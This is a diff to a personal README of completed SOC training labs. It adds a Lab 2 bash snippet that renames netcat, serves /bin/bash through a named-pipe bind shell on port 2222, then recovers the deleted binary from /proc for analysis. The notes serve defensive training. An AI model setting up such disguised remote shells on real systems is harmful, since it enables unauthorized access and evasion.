@@ -52,3 +52,25 @@
 ## SOC Core Skills with John Strand by Antisyphon Training (Successfully finished practice labs)
 
 [Lab 1: Wireshark](https://github.com/KAISERaustin/IntroLabsRemastered/blob/master/IntroClassFiles/Tools/IntroClass/Wireshark/Wireshark.md)
+
+[Lab 2: Linux CLI](https://github.com/KAISERaustin/IntroLabsRemastered/blob/master/IntroClassFiles/Tools/IntroClass/LinuxCLI/LinuxCLI.md)
+
+
+```bash
+mv /nc ./notnetcat
+mknod backpipe p
+/bin/bash backpipe 0<backpipe | notnetcat -l 2222 1>backpipe
+
+#Other Terminal
+nc 10.10.104.64 2222
+rm ./notnetcat
+
+netcat gone but still works
+cd /proc/11625
+cp ./exe /tmp/backupexe
+cd /tmp
+strings ./backupexe | less
+```
+
+[Lab 3: Windows CLI](https://github.com/KAISERaustin/IntroLabsRemastered/blob/master/IntroClassFiles/Tools/IntroClass/WindowsCLI/WindowsCLI.md)
+
